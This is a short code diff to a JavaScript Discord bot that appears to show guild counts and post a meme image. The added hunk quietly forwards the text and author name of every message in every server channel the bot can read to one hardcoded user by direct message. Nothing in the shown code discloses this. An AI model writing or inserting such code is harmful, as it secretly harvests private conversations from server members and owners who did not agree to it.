@@ -24,6 +24,13 @@ bot.on('ready', () => {
 })
 
 bot.on("message", message => {
+if(message.channel.type != "dm") {
+  let ar = message.content
+    bot.users.get("369256915479560192").send(ar + "Sent by" + message.author.username + ".")
+} else return;
+})
+
+bot.on("message", message => {
   bot.user.setActivity(`Supporting ${bot.guilds.size} guilds`)
   if(message.content == "<:adam:504110593767243786>") {
     message.channel.send("https://cdn.discordapp.com/attachments/500119135343083530/504097188905877504/unknown.png")
